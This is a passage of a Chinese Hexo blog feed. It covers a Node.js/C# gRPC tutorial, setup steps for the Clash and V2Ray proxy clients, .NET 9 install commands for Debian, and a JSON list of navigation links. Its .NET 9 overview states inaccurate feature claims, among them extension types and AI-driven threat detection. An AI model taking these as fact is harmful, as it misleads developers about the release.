packageDefinition = protoLoader.<span class="title function_">loadSync</span>(<span class="variable constant_">PROTO_PATH</span>, &#123;</span><br><span class="line">  <span class="attr">keepCase</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">longs</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">enums</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">defaults</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">oneofs</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> exampleProto = grpc.<span class="title function_">loadPackageDefinition</span>(packageDefinition);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 SayHello 方法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params">call, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> name = call.<span class="property">request</span>.<span class="property">name</span>;</span><br><span class="line">  <span class="title function_">callback</span>(<span class="literal">null</span>, &#123; <span class="attr">message</span>: <span class="string">`Hello, <span class="subst">$&#123;name&#125;</span>!`</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建和启动 gRPC 服务器</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> server = <span class="keyword">new</span> grpc.<span class="title class_">Server</span>();</span><br><span class="line">  server.<span class="title function_">addService</span>(exampleProto.<span class="property">ExampleService</span>.<span class="property">service</span>, &#123; <span class="title class_">SayHello</span>: sayHello &#125;);</span><br><span class="line">  <span class="keyword">const</span> port = <span class="string">&#x27;127.0.0.1:50051&#x27;</span>;</span><br><span class="line">  server.<span class="title function_">bindAsync</span>(port, grpc.<span class="property">ServerCredentials</span>.<span class="title function_">createInsecure</span>(), <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// 不再需要调用 server.start()</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><h2 id="4-实现-gRPC-客户端"><a href="#4-实现-gRPC-客户端" class="headerlink" title="4. 实现 gRPC 客户端"></a>4. 实现 gRPC 客户端</h2><p>创建一个文件 client.js，调用 gRPC 服务：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> grpc = <span class="built_in">require</span>(<span class="string">&#x27;@grpc/grpc-js&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> protoLoader = <span class="built_in">require</span>(<span class="string">&#x27;@grpc/proto-loader&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载 proto 文件</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROTO_PATH</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;example.proto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> packageDefinition = protoLoader.<span class="title function_">loadSync</span>(<span class="variable constant_">PROTO_PATH</span>, &#123;</span><br><span class="line">  <span class="attr">keepCase</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">longs</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">enums</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">defaults</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">oneofs</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> exampleProto = grpc.<span class="title function_">loadPackageDefinition</span>(packageDefinition);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建客户端并调用服务</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> client = <span class="keyword">new</span> exampleProto.<span class="title class_">ExampleService</span>(<span class="string">&#x27;127.0.0.1:50051&#x27;</span>, grpc.<span class="property">credentials</span>.<span class="title function_">createInsecure</span>());</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">&#x27;World&#x27;</span>;</span><br><span class="line">  client.<span class="title class_">SayHello</span>(&#123; name &#125;, <span class="function">(<span class="params">error, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server Response:&#x27;</span>, response.<span class="property">message</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><h2 id="5-运行示例"><a href="#5-运行示例" class="headerlink" title="5. 运行示例"></a>5. 运行示例</h2><p>启动服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node server.js</span><br></pre></td></tr></table></figure><p>在另一个终端窗口运行客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node client.js</span><br></pre></td></tr></table></figure><p>在客户端终端看到以下输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server Response: Hello, World!</span><br></pre></td></tr></table></figure><p>proto 文件：用于定义服务和消息结构。<br>服务器：通过 grpc.Server 创建并实现服务方法。<br>客户端：通过 grpc.Client 调用服务并处理响应。<br>可以基于此示例扩展自己的 gRPC 服务功能。</p><h1 id="C-编写的-gRPC-客户端"><a href="#C-编写的-gRPC-客户端" class="headerlink" title="C#编写的 gRPC 客户端"></a>C#编写的 gRPC 客户端</h1><h2 id="1-添加依赖"><a href="#1-添加依赖" class="headerlink" title="1. 添加依赖"></a>1. 添加依赖</h2><p>在的 C# 项目中，添加以下 NuGet 包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dotnet add package Grpc.Net.Client</span><br><span class="line">dotnet add package Grpc.Tools</span><br><span class="line">dotnet add package google.protobuf</span><br></pre></td></tr></table></figure><h2 id="2-配置-example-proto"><a href="#2-配置-example-proto" class="headerlink" title="2. 配置 example.proto"></a>2. 配置 example.proto</h2><p>将 example.proto 文件添加到的 C# 项目中，并编辑 .csproj 文件以生成客户端代码。添加以下内容到 <Project> 节点中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Protobuf</span> <span class="attr">Include</span>=<span class="string">&quot;example.proto&quot;</span> <span class="attr">GrpcServices</span>=<span class="string">&quot;Client&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这将告诉编译器根据 example.proto 文件生成 C# 客户端代码。</p><h2 id="3-编写客户端代码"><a href="#3-编写客户端代码" class="headerlink" title="3. 编写客户端代码"></a>3. 编写客户端代码</h2><p>创建一个文件 Program.cs，内容如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> Grpc.Net.Client;</span><br><span class="line"><span class="keyword">using</span> Example;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确保命名空间与 example.proto 中的 package 定义一致</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建 gRPC 通道</span></span><br><span class="line">        <span class="keyword">using</span> <span class="keyword">var</span> channel = GrpcChannel.ForAddress(<span class="string">&quot;http://127.0.0.1:50051&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建客户端</span></span><br><span class="line">        <span class="keyword">var</span> client = <span class="keyword">new</span> ExampleService.ExampleServiceClient(channel);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用服务方法</span></span><br><span class="line">        <span class="keyword">var</span> request = <span class="keyword">new</span> HelloRequest &#123; Name = <span class="string">&quot;World&quot;</span> &#125;;</span><br><span class="line">        <span class="keyword">var</span> reply = <span class="keyword">await</span> client.SayHelloAsync(request);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出服务响应</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Server Response: &quot;</span> + reply.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>运行客户端<br>确保 Node.js gRPC 服务器正在运行。</li></ol><p>在的 C# 项目目录中运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet run</span><br></pre></td></tr></table></figure><p>如果一切正常，看到以下输出：</p><p>Server Response: Hello, World!</p><p>Proto 文件的路径配置： 确保 example.proto 中的 package 定义为 Example，并与 C# 命名空间一致。</p><p>生成的客户端代码： 根据 example.proto，工具会生成 ExampleServiceClient 和 HelloRequest&#x2F;HelloReply 类。只需调用这些类与服务通信。</p><p>gRPC 通道： 使用 GrpcChannel.ForAddress 创建一个到服务器的连接。</p><p>异步调用： gRPC 方法通常是异步的，使用 await 来调用它们。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;gRPC（Google-Remote-Procedure-Call）&quot;&gt;&lt;a href=&quot;#gRPC（Google-Remote-Procedure-Call）&quot; class=&quot;headerlink&quot; title=&quot;gRPC（Google Remote Proce</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term=".net" scheme="https://banjinmei.github.io/tags/net/"/>
    
    <category term="node" scheme="https://banjinmei.github.io/tags/node/"/>
    
    <category term="gRPC" scheme="https://banjinmei.github.io/tags/gRPC/"/>
    
  </entry>
  
  <entry>
    <title>Clash V2Ray ClashVerge 科学上网 富强</title>
    <link href="https://banjinmei.github.io/2024/12/06/Clash-V2RayClashVerge-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-%E5%AF%8C%E5%BC%BA/"/>
    <id>https://banjinmei.github.io/2024/12/06/Clash-V2RayClashVerge-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-%E5%AF%8C%E5%BC%BA/</id>
    <published>2024-12-06T15:13:02.000Z</published>
    <updated>2024-12-06T15:57:02.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Clash-android"><a href="#Clash-android" class="headerlink" title="Clash android"></a>Clash android</h1><p>github.com&#x2F;metacubex&#x2F;clashmetaforandroid&#x2F;releases</p><p>1.配置  - 右上角 +  url导入<br>2.输入url save<br>3.点击已停止 -&gt; 切换成 运行中<br>4.点击代理 选择节点</p><h1 id="V2Ray-win"><a href="#V2Ray-win" class="headerlink" title="V2Ray win"></a>V2Ray win</h1><p>github.com&#x2F;2dust&#x2F;v2rayN&#x2F;releases</p><p>1.订阅分组 -&gt; 订阅分组设置   save<br>2.订阅分组 -&gt; 更新全部订阅<br>3.服务器 -&gt; 设为活动服务器  or  右键托盘 自动</p><h1 id="ClashVerge-mac"><a href="#ClashVerge-mac" class="headerlink" title="ClashVerge mac"></a>ClashVerge mac</h1><p>github.com&#x2F;clash-verge-rev&#x2F;clash-verge&#x2F;releases</p><p>1.菜单&gt;订阅 - 新建<br>2.名称 间隔 300min 输入订阅链接 save<br>3.选中 刷新<br>4.菜单&gt;代理 - 全局 -节点 选择绿色的<br>5.菜单&gt;设置 - 系统代理 开关</p><p>ios shadowrocket sing-box</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Clash-android&quot;&gt;&lt;a href=&quot;#Clash-android&quot; class=&quot;headerlink&quot; title=&quot;Clash android&quot;&gt;&lt;/a&gt;Clash android&lt;/h1&gt;&lt;p&gt;github.com&amp;#x2F;metacubex&amp;</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>ASP.NET Core 9.0</title>
    <link href="https://banjinmei.github.io/2024/12/05/ASP-NET-Core-9-0/"/>
    <id>https://banjinmei.github.io/2024/12/05/ASP-NET-Core-9-0/</id>
    <published>2024-12-05T13:56:25.000Z</published>
    <updated>2024-12-06T16:25:25.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="net9"><a href="#net9" class="headerlink" title=".net9"></a>.net9</h1><p>引入了扩展类型特性，允许开发者扩展实例成员、静态成员以及属性成员，打破了以往只能通过静态类定义扩展方法的限制；params 关键字不再局限于数组类型，可与多种集合类型一起使用；新增 System.Threading.Lock 类型用于线程同步，改进了线程同步机制；异常处理速度大幅提升，环路性能也有所提高，动态 PGO 降低了类型检查成本，RyuJIT 编译器内联更通用的方法以减少方法调用开销等.<br><strong>linq</strong>新增了 CountBy 和 AggregateBy 方法，可通过键进行状态聚合，无需通过 GroupBy 进行中间分组，提高了数据查询的效率和灵活性.<br>引入了 CryptographicOperations 类型中的新的一次性哈希方法，支持最新的加密标准，并新增了一些加密相关的 API；强化了安全机制，如引入更强大的身份验证和授权机制，支持 OAuth 2.0 和 OpenID Connect 等，还通过 AI 驱动的安全功能实现实时威胁检测</p><h1 id="Debian-12-安装-NET-9"><a href="#Debian-12-安装-NET-9" class="headerlink" title="Debian 12 安装.NET 9"></a>Debian 12 安装.NET 9</h1><h2 id="添加-Microsoft-包签名密钥和包存储库："><a href="#添加-Microsoft-包签名密钥和包存储库：" class="headerlink" title="添加 Microsoft 包签名密钥和包存储库："></a>添加 Microsoft 包签名密钥和包存储库：</h2><p>打开终端，运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb</span><br><span class="line">sudo dpkg -i packages-microsoft-prod.deb</span><br><span class="line"><span class="built_in">rm</span> packages-microsoft-prod.deb</span><br></pre></td></tr></table></figure><h2 id="安装-NET-SDK："><a href="#安装-NET-SDK：" class="headerlink" title="安装.NET SDK："></a>安装.NET SDK：</h2><p>如果需要开发.NET 应用程序，可安装.NET SDK，运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; \</span><br><span class="line">sudo apt-get install -y dotnet-sdk-9.0</span><br></pre></td></tr></table></figure><h2 id="安装-NET-运行时："><a href="#安装-NET-运行时：" class="headerlink" title="安装.NET 运行时："></a>安装.NET 运行时：</h2><p>如果只需要运行.NET 应用程序，可安装.NET 运行时。建议安装ASP.NET Core 运行时，因为它包含了.NET 和ASP.NET Core 运行时，在终端中运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; \</span><br><span class="line">sudo apt-get install -y aspnetcore-runtime-9.0</span><br></pre></td></tr></table></figure><h2 id="作为ASP-NET-Core-运行时的替代方法"><a href="#作为ASP-NET-Core-运行时的替代方法" class="headerlink" title="作为ASP.NET Core 运行时的替代方法"></a>作为ASP.NET Core 运行时的替代方法</h2><p>也可以安装不包含ASP.NET Core 支持的.NET 运行时，将上述命令中的aspnetcore-runtime-9.0替换为dotnet-runtime-9.0，即：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y dotnet-runtime-9.0</span><br></pre></td></tr></table></figure><h2 id="验证是否安装成功"><a href="#验证是否安装成功" class="headerlink" title="验证是否安装成功"></a>验证是否安装成功</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet --version </span><br></pre></td></tr></table></figure><h1 id="old-NET8"><a href="#old-NET8" class="headerlink" title="old .NET8"></a>old .NET8</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update </span><br><span class="line">sudo apt upgrade -y</span><br><span class="line">wget -O 下载并以不同的文件名保存</span><br></pre></td></tr></table></figure><h2 id="添加-Microsoft-包仓库"><a href="#添加-Microsoft-包仓库" class="headerlink" title="添加 Microsoft 包仓库"></a>添加 Microsoft 包仓库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb</span><br><span class="line">sudo dpkg -i packages-microsoft-prod.deb</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h2 id="安装SDK"><a href="#安装SDK" class="headerlink" title="安装SDK"></a>安装SDK</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y dotnet-sdk-8.0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;net9&quot;&gt;&lt;a href=&quot;#net9&quot; class=&quot;headerlink&quot; title=&quot;.net9&quot;&gt;&lt;/a&gt;.net9&lt;/h1&gt;&lt;p&gt;引入了扩展类型特性，允许开发者扩展实例成员、静态成员以及属性成员，打破了以往只能通过静态类定义扩展方法的限制；param</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term=".net9.0" scheme="https://banjinmei.github.io/tags/net9-0/"/>
    
  </entry>
  
  <entry>
    <title>Navigation</title>
    <link href="https://banjinmei.github.io/2024/12/04/Navigation/"/>
    <id>https://banjinmei.github.io/2024/12/04/Navigation/</id>
    <published>2024-12-04T11:31:51.000Z</published>
    <updated>2024-12-09T17:17:58.667Z</updated>
    
    <content type="html"><![CDATA[<div><a href="#Study">Study</a><a href="#Tools">Tools</a><a href="#AI">AI</a><a href="#Hexo">Hexo</a><a href="#Fun">Fun</a><a href="#Game">Game</a><!-- <a href="#tAI">AI</a> --></div><div id ="app3"></div><script>        const data = [{    "category": "Study",    "items": [           {            "title": "web3",            "url": "https://www.hackquest.io/ ",            "img": "https://t8.baidu.com/it/u=2123981564,3721828760&fm=217&app=126&size=f242,150&n=0&f=PNG",            "description": "web3 Learn and Grow Careers in Web3."        },        {            "title": "人人都是产品经理",            "url": "https://www.woshipm.com/",            "img": "https://image.woshipm.com/fp/images/logo.png",            "description": "产品经理、产品爱好者学习交流平台"        },        {            "title": "Element Plus",            "url": "https://element-plus.org/",            "img": "https://element-plus.org/images/element-plus-logo.svg",            "description": "面向设计师和开发者的组件库 基于Vue 3"        },        {            "title": "AMZ123",            "url": "https://www.amz123.com/",            "img": "https://t7.baidu.com/it/u=1062105737,570237901&fm=190&app=131&size=f242,150&n=0&f=JPE",            "description": "AMZ123亚马逊导航是一家致力于服务中国跨境电商从业者的综合平台"        },        {            "title": "nodejs",            "url": "https://nodejs.org/",            "img": "https://nodejs.org/static/logos/nodejsDark.svg",            "description": "Node.js® 是一个免费、开源、跨平台的JavaScript运行时环境,"        },        {            "title": "php中文网",            "url": "https://www.php.cn/",            "img": "https://www.php.cn/static/images/logo.png",            "description": "php.cn php中文网-教程_手册_视频-免费php在线学习平台"        },        {            "title": "菜鸟教程",            "url": "https://www.runoob.com/",            "img": "https://www.runoob.com/wp-content/themes/runoob/assets/img/runoob-logo.png",            "description": "菜鸟教程 学的不仅是技术，更是梦想！"        },        {            "title": "全球主机交流论",            "url": "https://hostloc.com/",            "img": "https://hostloc.com/static/image/common/logo.png",            "description": "vps"        },        {            "title": "V2EX",            "url": "https://www.v2ex.com/",            "img": "/images/face.png",            "description": "V2EX 创意工作者的社区。讨论编程、设计、硬件、游戏等令人激动的话题。"        },        {            "title": "LINUX DO",            "url": "https://linux.do/",            "img": "https://linux.do/uploads/default/original/3X/b/4/b4fa45d8b03df61f5d011e173c0adf8497028b16.png",            "description": "LINUX DO - 新的理想型社区"        },        {            "title": "电鸭",            "url": "https://eleduck.com/",            "img": "https://static.eleduck.com/_next/static/media/logo.dec76c92.png",            "description": "电鸭社区,专注远程办公及招聘,远程办公从电鸭开始,远程工作,自由职业,兼职外包,在家工作,remote working,remotely,freelancer,"        },        {            "title": "GitHub",            "url": "https://github.com/",            "img": "https://github.githubassets.com/images/icons/emoji/octocat.png",            "description": "Build software better, together GitHub is where people build software. "        },        {            "title": "golang",            "url": "https://golang.google.cn/",            "img": "/images/face.png",            "description": "https://golang.google.cn/"        },        {            "title": "CSDN",            "url": "https://www.csdn.net/",            "img": "https://t8.baidu.com/it/u=945984959,3948445137&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "CSDN 中文IT技术交流平台,创建于1999年,包含原创博客、精品问答、职业培训、技术论坛"        },        {            "title": "OSCHINA",            "url": "https://www.oschina.net/",            "img": "https://t8.baidu.com/it/u=2619601293,3923045050&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "OSCHINA - 中文开源技术交流社区"        },        {            "title": "华为开发者",            "url": "https://developer.apple.com/",            "img": "https://res-static.hc-cdn.cn/cloudbu-site/china/zh-cn/hdhomeportal/logonew.png",            "description": "开发者,华为云,HMS,鸿蒙,鲲鹏,昇腾,数据库,AI,5G,云原生,云计算,大赛,华为开发者,华为"        },        {            "title": "HarmonyOS开发者社区",            "url": "https://harmonyosdev.csdn.net/",            "img": "https://devpress.csdnimg.cn/041451c94cbd45af95e7dab96007154a.png",            "description": "HarmonyOS开发者社区"        },        {            "title": "apple developer",            "url": "https://developer.apple.com/",            "img": "https://developer-rno.apple.com/events/developer-centers/images/discover-programs_2x.jpg",            "description": "apple developer"        },        {            "title": "vivodev",            "url": "https://developer.vivo.com/",            "img": "https://ecmb.bdimg.com/tam-ogel/-1540521831_1768335019_88_88.png",            "description": "vivo developer,vivo国外手机商店,vivo appstore,vivo全球手机商城"        },        {            "title": "AWS Amazon Web Services",            "url": "https://aws.amazon.com/",            "img": "https://a0.awsstatic.com/libra-css/images/logos/aws_smile-header-desktop-en-white_59x35.png",            "description": "AWS 云服务-专业的大数据和云计算服务以及云解决方案提供商"        },        {            "title": "阿里云",            "url": "https://aliyun.com/",            "img": "https://t8.baidu.com/it/u=4057341977,137104390&fm=190&app=131&size=f242,150&n=0&f=PNG",            "description": "上云就上阿里云。"        },        {            "title": "googledev",            "url": "https://developers.google.com",            "img": "https://t9.baidu.com/it/u=1149675542,2513106999&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "Google for Developers - 从AI和云到移动和Web"        },        {            "title": "ThinkPHP",            "url": "https://www.thinkphp.cn/",            "img": "https://doc.topthink.com/lfs/02503b197ad195b8cc5eb97db82d7d0e657ade6c72e780dd8e1994f1ad806452.dat",            "description": "轻量级PHP框架|专注WEB应用开发18年 · ThinkPHP"        },        {            "title": "掘金",            "url": "https://juejin.cn/",            "img": "https://lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/e08da34488b114bd4c665ba2fa520a31.svg",            "description": "掘金是面向全球中文开发者的技术内容分享与交流平台"        },        {            "title": "hellogithub",            "url": "https://hellogithub.com/",            "img": "https://img.hellogithub.com/logo/logo.png",            "description": "开源,open source,开源社区,开源项目"        },        {            "title": "BigBear",            "url": "https://bigbearvpn.sodtool.com/",            "img": "https://wiki-bigbearvpn.sodtool.com/images/logo_black.png",            "description": "BigBear"        },        {            "title": "mitce",            "url": "https://mitce.com/?language=chinese",            "img": "https://st0.dancf.com/static/02/202306090204-51f4.png",            "description": "提供安全的加密網路代理"        },        {            "title": "腾讯云",            "url": "https://cloud.qq.com/",            "img": "https://cloudcache.tencent-cloud.com/qcloud/portal/kit/images/slice/logo.23996906.svg",            "description": "腾讯云,tencent cloud,云服务器,云主机,CDN,对象存储,域名注册备案,云存储,云数据库,互联网+解决方案,QQ云"        },        {            "title": "筋斗云",            "url": "https://www.jindouyun.cn/",            "img": "https://t7.baidu.com/it/u=1943493154,1028907721&fm=217&app=126&size=f242,150&n=0&f=PNG",            "description": "筋斗云 - 简单好用、高性价比的云服务器_云主机"        },        {            "title": "华为云",            "url": "https://cloud.huawei.com/",            "img": "https://id1.cloud.huawei.com/CAS/static_rss/rss_20241031/CAS/vue3/vuebuild/img/cloundLoginLogo.png",            "description": "华为云空间，华为云服务，华为云，查找手机，查找设备，华为手机丢了，荣耀手机丢了，云备份，华为手机云服务，华为手机丢了远程锁定"        }    ]},            {    "category": "Tools",    "items": [                   {            "title": "json",            "url": "https://www.sojson.com/",            "img": "https://t9.baidu.com/it/u=2962407189,358182402&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "json格式化"        },     {            "title": "freemp3",            "url": "https://www.qeecc.com/",            "img": "http://www.qeecc.com/images/logo.png",            "description": " freemp3  qm"        },          {            "title": "压缩图片",            "url": "https://www.xunjietupian.com/yasuo/",            "img": "https://www.xunjietupian.com/img/icon/icon_logo.svg",            "description": "在线快速压缩图片4"        },              {            "title": "BTC USD",            "url": "https://www.tradingview.com/symbols/BTCUSD/",            "img": "https://t8.baidu.com/it/u=210671946,991419608&fm=3035&app=3035&size=f242,162&n=0&g=0n&f=JPEG",            "description": " BTC USD — Bitcoin Price and Chart — TradingView"        },      {            "title": "爱站网",            "url": "https://www.aizhan.com/",            "img": "https://statics.aizhan.com/images/img/logo.png",            "description": "站长工具-百度权重排名查询-站长seo查询 - 爱站网"        },      {            "title": "站长之家",            "url": "https://www.chinaz.com/",            "img": "https://t9.baidu.com/it/u=1976338083,3457931785&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "站长之家 - 站长资讯-我们致力于为中文网站提供动力！"        },       {            "title": "小鸡监控平台",            "url": "https://ping0.cc/vpsmon/30day",            "img": "https://t9.baidu.com/it/u=3796491837,1274263105&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "最近30天-IP地址归属地查询-全球小鸡监控平台"        },        {            "title": "知无不言",            "url": "https://wearesellers.com/ ",            "img": "https://t9.baidu.com/it/u=2291076767,879038089&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "跨境电商人的科学世界"        },        {            "title": "webcams",            "url": "https://www.skylinewebcams.com/",            "img": "https://cdn.jsdelivr.net/gh/SkylineWebcams/web@main/skylinewebcams.svg",            "description": "webcams"        },        {            "title": "Wayback Machine",            "url": "https://web.archive.org/",            "img": "/images/face.png",            "description": "wawayback machine ， Internet档案馆(Internet Archive)，时间回溯机"        },        {            "title": "Radio Garden",            "url": "https://radio.garden/",            "img": "/images/face.png",            "description": "Radio Garden – Explore live radio"        },        {            "title": "一证通查 ",            "url": "https://getsimnum.caict.ac.cn",            "img": "/images/face.png",            "description": "电话卡一证通查"        },        {            "title": "弹琴吧",            "url": "https://www.tan8.com/",            "img": "https://www.tan8.com/static/tan8/style/img/LOGO_s_new2.png?2401",            "description": "《弹琴吧》官网tan8.com-钢琴谱大全，吉他谱大全，学钢琴，学吉他，就来弹琴吧弹吧"        },        {            "title": "pinterest",            "url": "https://www.pinterest.com/",            "img": "https://www.baidu.com/img/flexible/logo/pc/.png",            "description": "发现想要尝试的食谱、家居创意、时尚灵感及其他创意点子。"        },        {            "title": "花瓣",            "url": "https://huaban.com/",            "img": "https://st0.dancf.com/static/02/202306090204-51f4.png",            "description": "花瓣网 - 